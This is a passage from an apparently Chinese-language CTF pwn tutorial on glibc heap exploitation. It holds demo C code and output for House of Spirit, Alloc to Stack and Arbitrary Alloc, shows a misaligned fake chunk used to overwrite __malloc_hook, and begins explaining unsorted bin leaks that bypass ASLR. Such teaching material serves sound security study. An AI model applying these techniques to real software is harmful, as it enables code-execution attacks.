    <span class="token comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">This file demonstrates the house of spirit attack<span class="token punctuation">.</span>
Calling <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> once so that it sets up its memory<span class="token punctuation">.</span>
We will now overwrite a pointer to point to a fake <span class="token char">'fastbin'</span> region<span class="token punctuation">.</span>
This <span class="token function">region</span> <span class="token punctuation">(</span>memory of length<span class="token operator">:</span> <span class="token number">80</span><span class="token punctuation">)</span> contains two chunks<span class="token punctuation">.</span> The first starts at <span class="token number">0x7ffc9e07e6d8</span> <span class="token operator">and</span> the second at <span class="token number">0x7ffc9e07e708.</span>
This chunk<span class="token punctuation">.</span>size of <span class="token keyword">this</span> region has to be <span class="token number">16</span> more than the <span class="token function">region</span> <span class="token punctuation">(</span>to accomodate the chunk data<span class="token punctuation">)</span> <span class="token keyword">while</span> still falling into the fastbin <span class="token function">category</span> <span class="token punctuation">(</span><span class="token operator">&lt;=</span> <span class="token number">128</span> on x64<span class="token punctuation">)</span><span class="token punctuation">.</span> The <span class="token function">PREV_INUSE</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">)</span> bit is ignored by free <span class="token keyword">for</span> fastbin<span class="token operator">-</span>sized chunks<span class="token punctuation">,</span> however the <span class="token function">IS_MMAPPED</span> <span class="token punctuation">(</span>second lsb<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token function">NON_MAIN_ARENA</span> <span class="token punctuation">(</span>third lsb<span class="token punctuation">)</span> bits cause problems<span class="token punctuation">.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that <span class="token keyword">this</span> has to be the size of the next malloc request rounded to the internal size used by the malloc implementation<span class="token punctuation">.</span> E<span class="token punctuation">.</span>g<span class="token punctuation">.</span> on x64<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x38</span> will all be rounded to <span class="token number">0x40</span><span class="token punctuation">,</span> so they would work <span class="token keyword">for</span> the malloc parameter at the end<span class="token punctuation">.</span> 
The chunk<span class="token punctuation">.</span>size of the <span class="token operator">*</span>next<span class="token operator">*</span> fake region has to be sane<span class="token punctuation">.</span> That is <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">SIZE_SZ</span> <span class="token punctuation">(</span><span class="token operator">&gt;</span> <span class="token number">16</span> on x64<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">&lt;</span> av<span class="token operator">-&gt;</span><span class="token function">system_mem</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span> <span class="token number">128</span>kb by <span class="token keyword">default</span> <span class="token keyword">for</span> the main arena<span class="token punctuation">)</span> to pass the nextsize integrity checks<span class="token punctuation">.</span> No need <span class="token keyword">for</span> fastbin size<span class="token punctuation">.</span>
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk<span class="token punctuation">,</span> <span class="token number">0x7ffc9e07e6d8.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that the memory address of the <span class="token operator">*</span>region<span class="token operator">*</span> associated with <span class="token keyword">this</span> chunk must be <span class="token number">16</span><span class="token operator">-</span>byte aligned<span class="token punctuation">.</span>
Freeing the overwritten pointer<span class="token punctuation">.</span>
Now the next malloc will <span class="token keyword">return</span> the region of our fake chunk at <span class="token number">0x7ffc9e07e6d8</span><span class="token punctuation">,</span> which will be <span class="token number">0x7ffc9e07e6e0</span><span class="token operator">!</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x7ffc9e07e6e0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>想要使用 House Of Spirit 的技术分配 <code>chunk</code> 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong></p></blockquote><hr><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><blockquote><p>该技术的核心点在于劫持 <code>fast bin</code> 链表中 <code>chunk</code> 的 <code>fd</code> 指针，<strong>把 <code>fd</code> 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据</strong>，比如：返回地址等，需要栈上存在有满足条件的 <code>size</code> 值</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_chunk</span>
<span class="token punctuation">{</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span>
<span class="token punctuation">}</span> CHUNK<span class="token punctuation">,</span> <span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    CHUNK stack_chunk<span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>

    stack_chunk<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_chunk<span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这次我们把 <code>fake_chunk</code> 置于栈中称为 <code>stack_chunk</code></p><p>同时劫持了 <code>fast bin</code> 链表中 <code>chunk</code> 的 <code>fd</code> 值，通过把这个 <code>fd</code> 值指向 <code>stack_chunk</code> 就可以实现在栈中分配 <code>fast bin chunk</code></p></blockquote><p>执行 <code>*(long long *)chunk1=&amp;stack_chunk</code> 后，<code>chunk1</code> 的 <code>fd</code> 指针指向了 <code>stack_chunk</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A852.png" alt="CTF - PWN_堆相关的漏洞与利用52.png"></p><p>第一次执行&nbsp;<code>malloc</code> 使得 <code>fast bin</code> 链表指向了 <code>stack_chunk</code>，这意味着下一次分配会使用 <code>stack_chunk</code> 的内存进行：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A853.png" alt="CTF - PWN_堆相关的漏洞与利用53.png"></p><p>可以看到第二次执行 <code>malloc</code> 的返回值 RAX 为 0x7fffffffdc80，也就是 <code>stack_chunk</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A854.png" alt="CTF - PWN_堆相关的漏洞与利用54.png"></p><p><code>stack_chunk</code> 的地址在栈上，而不在堆上：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A855.png" alt="CTF - PWN_堆相关的漏洞与利用55.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A856.png" alt="CTF - PWN_堆相关的漏洞与利用56.png"></p><hr><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><blockquote><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是<strong>分配的目标不再是栈中</strong></p><p>Arbitrary Alloc 在 CTF 中使用更加频繁，我们可以利用字节错位等方法来绕过 <code>size</code> 域的检验，实现任意地址分配 <code>chunk</code>，最后的效果也就相当于<strong>任意地址写任意值</strong></p></blockquote><p>实际上，只要满足目标地址存在合法的 <code>size</code> 域（这个 <code>size</code> 域是构造的，还是自然存在的都无妨），我们可以把 <code>chunk</code> 分配到任意的可写内存中，比如：<code>bss</code>、<code>heap</code>、<code>data</code>、<code>stack</code> 等等</p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>

    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token number">0x7ffff7dd1af5</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在这个例子中，我们使用字节错位来实现直接分配 <code>fast bin</code> 到 <code>__malloc_hook</code> 的位置，相当于覆盖 <code>__malloc_hook</code> 来控制程序流程</p></blockquote><p>上述代码中的 <code>0x7ffff7dd1af5</code> 是根据本机的情况得出的值，想要得到这个值，首先我们要观察欲写入地址 <code>__malloc_hook</code> 附近是否存在可以字节错位的情况</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A857.png" alt="CTF - PWN_堆相关的漏洞与利用57.png"></p><p>图中 <code>0x7ffff7dd1b10</code> 是我们想要控制的 <code>__malloc_hook</code> 的地址，于是我们向上寻找是否可以错位出一个合法的 <code>size</code> 域。因为这是个 64 位程序，因此 <code>fast bin</code> 的范围为 32 字节到 128 字节 (<code>0x20 - 0x80</code>)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//这里的 size 指用户区域，因此要小 2 倍 SIZE_SZ</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察发现 <code>0x7ffff7dd1af5</code> 处可以实现错位构造出一个 <code>0x000000000000007f</code>，因为 <code>0x7f</code> 在计算 <code>fast bin index</code> 时，是属于 <code>index 5</code> 的，即 <code>chunk</code> 大小为 <code>0x70</code>：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// 注意 sz 的大小是 unsigned int，因此只占 4 个字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而 <code>chunk</code> 大小为 <code>0x70</code> 又包含了 <code>0x10</code> 的 <code>chunk_header</code>，因此我们选择分配 <code>0x60</code> 的 <code>fast bin</code>，将其加入链表：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A858.png" alt="CTF - PWN_堆相关的漏洞与利用58.png"></p><p>经过两次 <code>malloc</code> 分配后，可以观察到 <code>chunk</code> 被分配到 <code>0x7ffff7dd1afd</code>，因此我们就可以直接控制 <code>__malloc_hook</code> 的内容：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A859.png" alt="CTF - PWN_堆相关的漏洞与利用59.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A860.png" alt="CTF - PWN_堆相关的漏洞与利用60.png"></p><p>在我的 Glibc 2.23 中 <code>__realloc_hook</code> 与 <code>__malloc_hook</code> 是连在一起的：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A861.png" alt="CTF - PWN_堆相关的漏洞与利用61.png"></p><hr><h1 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h1><blockquote><p>Unsorted bin Attack 是一类漏洞的利用方法，是指所有基于 <code>unsorted bin</code> 机制的漏洞利用方法</p><p>参考文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bnNvcnRlZC1iaW4tYXR0YWNrLyN1bnNvcnRlZC1iaW4=">Unsorted Bin Attack - CTF Wiki</a></p></blockquote><p>Unsorted bin Attack 的利用前提：</p><ul><li>控制 <code>unsorted bin chunk</code> 的 <code>bk</code> 指针</li></ul><p>Unsorted bin Attack 可以达到的效果是：<strong>实现修改任意地址值为一个较大的数值</strong></p><hr><h2 id="Unsorted-bin-Leak"><a href="#Unsorted-bin-Leak" class="headerlink" title="Unsorted bin Leak"></a>Unsorted bin Leak</h2><blockquote><p><code>unsorted bin</code> 首先可以用来<strong>泄露一些信息</strong></p></blockquote><p>由于 <code>unsorted bin</code>&nbsp;在管理时为循环双向链表，若&nbsp;<code>unsorted bin</code>&nbsp;中有两个&nbsp;<code>bin</code>，那么该链表结构如下：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A862.png" alt="CTF - PWN_堆相关的漏洞与利用62.png"></p><p>也就是说，在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的&nbsp;<code>fd</code>&nbsp;指针会指向&nbsp;<code>main_arena</code>&nbsp;结构体内部</p><p>如果我们可以把正确的&nbsp;<code>fd</code>&nbsp;指针泄露出来，就可以获得一个与&nbsp;<code>main_arena</code>&nbsp;有固定偏移的地址，这个偏移可以通过 GDB 调试得出</p><blockquote><p><code>main_arena</code>&nbsp;是一个&nbsp;<code>struct malloc_state</code>&nbsp;类型的全局变量，是&nbsp;<code>ptmalloc2</code>&nbsp;管理主分配区的唯一实例，其会被分配在&nbsp;<code>.data</code>&nbsp;或者&nbsp;<code>.bss</code>&nbsp;等段上</p><p><strong>如果我们有进程所使用的&nbsp;<code>libc.so</code>&nbsp;文件的话，就可以获得&nbsp;<code>main_arena</code>&nbsp;与&nbsp;libc&nbsp;基地址的偏移，实现对&nbsp;<code>ASLR</code>&nbsp;的绕过</strong></p></blockquote><p>获得&nbsp;<code>main_arena</code>&nbsp;与&nbsp;libc&nbsp;基地址的偏移主要有两种方法：</p><ul><li>通过 <code>__malloc_trim</code> 函数得出</li><li>通过 <code>__malloc_hook</code> 直接计算</li></ul><p>一般来说，要实现 Unsorted bin Leak，需要有&nbsp;UAF</p><blockquote><p>在 CTF 中，一般的笔记管理题都会有&nbsp;<code>show</code>&nbsp;的功能，对<strong>处于 unsorted bin 链表尾的节点</strong>&nbsp;<code>show</code>&nbsp;就可以获得&nbsp;<code>libc</code>&nbsp;的基地址了</p><p>另外，CTF&nbsp;中堆往往是刚刚初始化的，所以&nbsp;<code>unsorted bin</code>&nbsp;一般都是干净的，<mark>当&nbsp;<code>unsorted bin</code>&nbsp;中只存在一个&nbsp;<code>bin</code>&nbsp;的时候，该&nbsp;<code>bin</code>&nbsp;的&nbsp;<code>fd</code>&nbsp;和&nbsp;<code>bk</code>&nbsp;都会指向&nbsp;<code>main_arena</code>&nbsp;中</mark></p></blockquote><p>另外，<strong>如果我们无法做到访问链表尾，但是可以访问链表头</strong>：</p><ul><li>在 32 位的环境下，对链表头进行&nbsp;<code>printf</code>&nbsp;等操作，往往可以把&nbsp;<code>fd</code>&nbsp;和&nbsp;<code>bk</code>&nbsp;一起输出出来，这个时候同样可以实现有效的 leak</li><li>在 64 位的环境下，由于高地址往往为&nbsp;<code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效的 leak</li></ul><hr><h3 id="通过-malloc-trim-得到偏移"><a href="#通过-malloc-trim-得到偏移" class="headerlink" title="通过 __malloc_trim() 得到偏移"></a>通过 __malloc_trim() 得到偏移</h3><p>在&nbsp;<code>malloc.c</code>&nbsp;中有这样一段代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span>
<span class="token function">__malloc_trim</span> <span class="token punctuation">(</span>size_t s<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>__malloc_initialized <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">ptmalloc_init</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  mstate ar_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">;</span>   <span class="token comment">// &lt;= here!</span>
  <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
      <span class="token function">__libc_lock_lock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-&gt;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">|=</span> <span class="token function">mtrim</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">__libc_lock_unlock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-&gt;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

